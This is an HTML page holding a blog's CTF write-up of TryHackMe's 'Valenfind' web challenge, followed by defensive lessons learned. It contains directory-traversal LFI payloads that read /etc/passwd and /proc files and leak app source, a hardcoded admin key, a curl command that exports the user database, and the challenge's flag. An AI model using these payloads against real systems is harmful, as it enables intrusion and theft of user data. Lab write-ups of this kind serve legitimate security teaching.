@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' cdn.jsdelivr.net fonts.googleapis.com; font-src 'self' fonts.gstatic.com; img-src 'self' data: https:; media-src 'self'; connect-src 'self' cdn.jsdelivr.net;" />
+  <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+  <meta name="referrer" content="strict-origin-when-cross-origin" />
+  <meta http-equiv="Permissions-Policy" content="camera=(), microphone=(), geolocation=()" />
+  <title>Valenfind — Writeup</title>
+  <meta name="description" content="Valenfind CTF writeup — Medium difficulty Linux &amp; Web challenge">
+  <link rel="icon" href="../favicon.png" type="image/png" sizes="32x32">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+  <!-- Loader overlay (CLI style) -->
+  <div id="loader-overlay">
+    <div class="loader-cli">
+      <div class="loader-cli-line"><span id="loader-cli-bar"></span></div>
+      <div class="loader-cli-line" id="loader-cli-label">[sudo] updating & upgrading...</div>
+      <div class="loader-cli-phrase" id="loader-phrase">Initializing...</div>
+    </div>
+  </div>
+  <!-- Background video for writeup page -->
+  <div class="bg-video-wrapper" aria-hidden="true">
+    <video id="bgVideoWriteup" class="bg-video" autoplay muted loop playsinline preload="auto">
+      <source src="../assets/videos/projects_background.mp4" type="video/mp4">
+    </video>
+    <div class="bg-overlay-glass"></div>
+  </div>
+
+  <nav id="site-navbar" class="navbar navbar-expand-lg navbar-dark bg-transparent px-4">
+    <div class="container-fluid">
+      <a class="navbar-brand autograph autograph-painter p-0" href="../index.html">xorxorplain</a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navMenu">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navMenu">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item"><a class="nav-link" href="../index.html">Home</a></li>
+          <li class="nav-item"><a class="nav-link" href="../about.html">About</a></li>
+          <li class="nav-item"><a class="nav-link active" href="projects.html">Projects</a></li>
+          <li class="nav-item"><a class="nav-link" href="../blog/index.html">Blog</a></li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <main class="writeup-page">
+    <div class="writeup-container glass-content">
+      <!-- Back link -->
+      <a href="projects.html" class="writeup-back" aria-label="Back to projects">
+        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 -960 960 960" fill="currentColor"><path d="M480-160 160-480l320-320 56 56-224 224h488v80H312l224 224-56 56Z"/></svg>
+        <span>Projects</span>
+      </a>
+
+      <!-- Header -->
+      <header class="writeup-header">
+        <div class="writeup-meta">
+          <span class="writeup-badge writeup-badge--medium">Medium</span>
+          <span class="writeup-env">Linux &amp; Web</span>
+          <span class="writeup-date">18/02/2026</span>
+        </div>
+        <h1 class="writeup-title">Valenfind</h1>
+      </header>
+
+      <!-- Tags -->
+      <div class="writeup-tags">
+        <span class="writeup-tag">ffuf</span>
+        <span class="writeup-tag">LFI</span>
+        <span class="writeup-tag">Python</span>
+        <span class="writeup-tag">Flask</span>
+        <span class="writeup-tag">Hardcoded Credentials</span>
+        <span class="writeup-tag">SQLite</span>
+        <span class="writeup-tag">Web</span>
+        <span class="writeup-tag">Linux</span>
+      </div>
+
+      <hr class="writeup-divider">
+
+      <!-- Writeup body (rendered from Markdown) -->
+      <article class="writeup-body">
+        <h2>Overview</h2>
+<p>Valenfind is a medium web challenge from TryHackMe&#39;s <em>Love at First Breach 2026</em> event. The premise is a Valentine&#39;s dating app that was supposedly &quot;vibe-coded&quot;. The attack chain moves from directory enumeration to a Local File Inclusion vulnerability, which leaks the application source. Inside the source sits a hardcoded API key that grants access to a hidden admin endpoint, allowing full database exfiltration and the flag. Cool box.</p>
+<h2>Reconnaissance</h2>
+<h3>Directory Enumeration</h3>
+<p>The application runs on port 5000. Starting with <code>ffuf</code> using <code>common.txt</code>:</p>
+<pre><code class="language-bash">ffuf -u http://MACHINE_IP:5000/FUZZ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</code></pre>
+<p>Standard endpoints showed up: <code>/login</code>, <code>/register</code>, <code>/dashboard</code>. After registering an account and logging in, the dashboard exposes user profiles with visible usernames. Navigating directly to <code>/profile/admin</code> confirmed that a privileged admin account exists.</p>
+<h2>Exploitation</h2>
+<h3>Poking at the Attack Surface</h3>
+<p>After mapping the app, there was quite a bit of attack surface to work through. The dashboard had profile fields, search functionality, and various user-facing inputs. Before stumbling into file inclusion I spent time methodically testing for reflected and stored XSS across profile fields and query parameters, SQL injection on the login and search forms, and IDOR on profile endpoints. None of those panned out. The breakthrough came from a different angle entirely when i noticed something wierd in burp while changing themes.</p>
+<h3>Local File Inclusion</h3>
+<p>Inspecting the dashboard source revealed a JavaScript function that loads layout themes dynamically:</p>
+<pre><code class="language-javascript">fetch(`/api/fetch_layout?layout=${layoutName}`)
+</code></pre>
+<p>Classic file inclusion territory. No filtering at all — basic directory traversal worked on the first try:</p>
+<pre><code>http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../etc/passwd
+</code></pre>
+<p>The server dumped <code>/etc/passwd</code>. LFI confirmed.</p>
+<h3>Enumerating the Process Environment</h3>
+<p>Before going after source code, I checked <code>/proc/self/environ</code> to see if the app had any secrets exposed as environment variables. Things like <code>SECRET_KEY</code>, <code>ADMIN_PASSWORD</code>, <code>DB_PASSWORD</code>, <code>FLAG</code>, <code>JWT_SECRET</code>, or <code>FLASK_ENV</code> can sometimes be sitting right there.</p>
+<pre><code>http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/environ
+</code></pre>
+<p>No luck. The environment was clean, just standard system variables. One interesting detail though: <code>HOME=/root</code>, meaning the Flask app is running as root. The fact that the environment was void of anything sensitive suggested that secrets are hardcoded in the source code or a config file rather than being passed in properly.</p>
+<h3>Finding the Application Path</h3>
+<p>Next I pulled <code>/proc/self/cmdline</code> to get the exact command line of the running process:</p>
+<pre><code>http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../proc/self/cmdline
+</code></pre>
+<p>This returned the path: <code>/opt/Valenfind/app.py</code>.</p>
+<h3>Source Code Recovery</h3>
+<p>With the path in hand, I grabbed the full source:</p>
+<pre><code>http://MACHINE_IP:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py
+</code></pre>
+<p>The server returned the entire <code>app.py</code>. Key parts of the leaked source:</p>
+<pre><code class="language-python">import os
+import sqlite3
+import hashlib
+from flask import (Flask, render_template, request, redirect,
+                   url_for, session, send_file, g, flash, jsonify)
+from seeder import INITIAL_USERS
+
+app = Flask(__name__)
+app.secret_key = os.urandom(24)
+ADMIN_API_KEY = &quot;CUPID_MASTER_KEY_2024_XOXO&quot;
+DATABASE = &#39;cupid.db&#39;
+</code></pre>
+<p>Yay! Hardcoded admin API key, right at the top. The source also revealed a hidden endpoint that uses this key to export the database:</p>
+<pre><code class="language-python">@app.route(&#39;/api/admin/export_db&#39;)
+def export_db():
+    auth_header = request.headers.get(&#39;X-Valentine-Token&#39;)
+    if auth_header == ADMIN_API_KEY:
+        try:
+            return send_file(DATABASE, as_attachment=True,
+                             download_name=&#39;valenfind_leak.db&#39;)
+        except Exception as e:
+            return str(e)
+    else:
+        return jsonify({
+            &quot;error&quot;: &quot;Forbidden&quot;,
+            &quot;message&quot;: &quot;Missing or Invalid Admin Token&quot;
+        }), 403
+</code></pre>
+<p>The only thing protecting the database dump is a string comparison against the hardcoded key.</p>
+<h3>Database Exfiltration</h3>
+<p>At this point it was just a matter of sending the right header:</p>
+<pre><code class="language-bash">curl -X GET &quot;http://MACHINE_IP:5000/api/admin/export_db&quot; \
+  -H &quot;X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO&quot; \
+  --output valenfind.db
+</code></pre>
+<p>The server handed over the full SQLite database. Querying it locally:</p>
+<pre><code class="language-bash">sqlite3 valenfind.db &quot;SELECT * FROM users;&quot;
+</code></pre>
+<p>The <code>cupid</code> user entry contained the flag in the address field.</p>
+<h2>Flags</h2>
+<ul>
+<li><strong>Flag:</strong> <code>v1be_c0ding_1s_not_my_cup_0f_t3a</code></li>
+</ul>
+<p>Vibe coding can be fun, but maybe launching a public app with an insecure backend isn’t the ideal stress test in real life.</p>
+<h2>Lessons Learned</h2>
+<ul>
+<li>Containerization would’ve saved the day.
+Or, at the very least, don’t launch it with <code>sudo python3 app.py</code> -&gt; the Flask process inherits root privileges.Create a low-privileged user (e.g., www-data, flask, or appuser) and run the application with least privilege.</li>
+<li>Hardcoded secrets in source code are one <code>cat</code> away from compromise once any file-read vulnerability exists. API keys and credentials belong in environment variables (or PW managers) stored properly.</li>
+<li>Hidden endpoints are not secure endpoints. If the only thing protecting an admin route is that nobody knows the URL, any source leak (or brute-force) exposes it immediately.</li>
+<li>The &quot;vibe coding&quot; premise here is a good reminder: AI-generated code still needs human review, especially around authentication, authorization, and input handling. Insecure patterns are common in the training data (public code), so they are statistically reinforced and reproduced by models (atleast without explicit security constraints).</li>
+</ul>
+
+      </article>
+    </div>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="../assets/js/title-glitch.js"></script>
+  <script src="../assets/js/loader.js"></script>
+</body>
+</html>
